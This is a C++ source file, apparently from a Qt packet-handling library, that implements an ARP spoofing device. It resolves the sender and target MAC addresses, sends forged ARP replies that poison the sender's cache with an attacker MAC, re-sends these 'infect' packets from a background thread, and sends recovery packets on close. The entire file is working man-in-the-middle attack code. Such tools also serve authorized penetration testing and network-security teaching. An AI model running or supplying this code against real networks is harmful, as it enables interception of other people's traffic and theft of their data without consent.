#include "garpspoof.h"

// ----------------------------------------------------------------------------
// GArpSpoof
// ----------------------------------------------------------------------------
GArpSpoof::GArpSpoof(QObject* parent) : GSyncPcapDevice(parent) {
	qDebug() << ""; // gilgil temp 2019.08.16
}

GArpSpoof::~GArpSpoof() {
	qDebug() << ""; // gilgil temp 2019.08.16
  close();
}

bool GArpSpoof::doOpen() {
	if (!GPcapDevice::doOpen()) return false;

	GNetIntf* intf = GNetIntfs::instance().findByName(devName_);
	if (intf == nullptr) {
		SET_ERR(GErr::DEVICE_NOT_SPECIFIED, QString("cat not find device for ").arg(devName_));
		return false;
	}
	intf_ = *intf;

	sessionList_.clear();
	sessionMap_.clear();
	for (GAtm::iterator it = atm_.begin(); it != atm_.end();) {
		GMac mac = it.value();
		if (mac == GMac::cleanMac())
			it = atm_.erase(it);
		else
			it++;
	}

	for (GObj* obj: propSessions_) {
		GArpSpoofSession* propSession = PArpSpoofSession(obj);
		GIp senderIp = propSession->senderIp_;
		GMac senderMac = propSession->senderMac_;
		GIp targetIp = propSession->targetIp_;
		GMac targetMac = propSession->targetMac_;

		if (senderIp == intf_.ip()) {
			QString msg = QString("sender(%1) can not be my ip").arg(QString(senderIp));
			SET_ERR(GErr::FAIL, msg);
			return false;
		}

		if (targetIp == intf_.ip()) {
			QString msg = QString("target(%1) can not be my ip").arg(QString(targetIp));
			SET_ERR(GErr::FAIL, msg);
			return false;
		}

		if (senderIp == targetIp) {
			QString msg = QString("sender(%1) and target(%2) can not be same").arg(QString(senderIp), QString(targetIp));
			SET_ERR(GErr::FAIL, msg);
			return false;
		}

		Session session(senderIp, senderMac, targetIp, targetMac);
		sessionList_.push_back(session);
		sessionMap_[GFlow::IpFlowKey(session.senderIp_, session.targetIp_)] = session;
		if (atm_.find(senderIp) == atm_.end())
			atm_[session.senderIp_] = session.senderMac_;
		if (atm_.find(targetIp) == atm_.end())
			atm_[session.targetIp_] = session.targetMac_;
	}

	GSyncPcapDevice device;
	device.devName_ = this->devName_;
	if (!device.open()) {
		err = device.err;
		return false;
	}
	bool res = atm_.waitAll(&device);
	if (!res) {
		QString msg = "can not find all host(s) ";
		for (GAtm::iterator it = atm_.begin(); it != atm_.end(); it++) {
			GMac mac = it.value();
			if (mac.isClean()) {
				GIp ip = it.key();
				msg += QString(ip) += " ";
			}
		}
		SET_ERR(GErr::FAIL, msg);
		return false;
	}
	device.close();

	for(Session& session: sessionList_) {
		if (session.senderMac_.isClean())
			session.senderMac_ = atm_[session.senderIp_];
		if (session.targetMac_.isClean())
			session.targetMac_ = atm_[session.targetIp_];
	}

	attackMac_ = virtualMac_.isClean() ? intf_.mac() : virtualMac_;

	sendArpInfectAll();

	if (infectInterval_ != 0)
		infectThread_.start();

	return true;
}

bool GArpSpoof::doClose() {
	qDebug() << ""; // gilgil temp 2019.08.16
	infectThread_.we_.wakeAll();
	infectThread_.wait();

	for (int i = 0; i < 3; i++) {
		sendARPReciverAll();
		QThread::msleep(100);
	}

  return GPcapDevice::doClose();
}

void GArpSpoof::InfectThread::run() {
	while (true) {
		if (we_.wait(arpSpoof_->infectInterval_)) break;
		arpSpoof_->sendArpInfectAll();
	}
}

bool GArpSpoof::sendArpInfectAll() {
	for (Session& session: sessionList_) {
		if (!sendArpInfect(&session))
			return false;
	}
	return true;
}

bool GArpSpoof::sendArpInfect(Session* session) {
	return sendArp(session, true);
}

bool GArpSpoof::sendARPReciverAll() {
	for (Session& session: sessionList_) {
		if (!sendArpRecover(&session))
			return false;
	}
	return true;
}

bool GArpSpoof::sendArpRecover(Session* session) {
	return sendArp(session, false);
}

bool GArpSpoof::sendArp(Session* session, bool infect) {
	GEthArpHdr sendPacket;

	sendPacket.ethHdr_.dmac_ = session->senderMac_;
	sendPacket.ethHdr_.smac_ = attackMac_;
	sendPacket.ethHdr_.type_ = htons(GEthHdr::Arp);

	sendPacket.arpHdr_.hrd_ = htons(GArpHdr::ETHER);
	sendPacket.arpHdr_.pro_ = htons(GEthHdr::Ip4);
	sendPacket.arpHdr_.hln_ = sizeof(GMac);
	sendPacket.arpHdr_.pln_ = sizeof(GIp);
	sendPacket.arpHdr_.op_ = htons(GArpHdr::Reply);
	sendPacket.arpHdr_.smac_ = infect ? attackMac_ : session->targetMac_;
	sendPacket.arpHdr_.sip_ = htonl(session->targetIp_);
	sendPacket.arpHdr_.tmac_ = session->senderMac_;
	sendPacket.arpHdr_.tip_ = htonl(session->senderIp_);

	GPacket::Result res = write(GBuf(pbyte(&sendPacket), sizeof(sendPacket)));
	return res == GPacket::Ok;
}
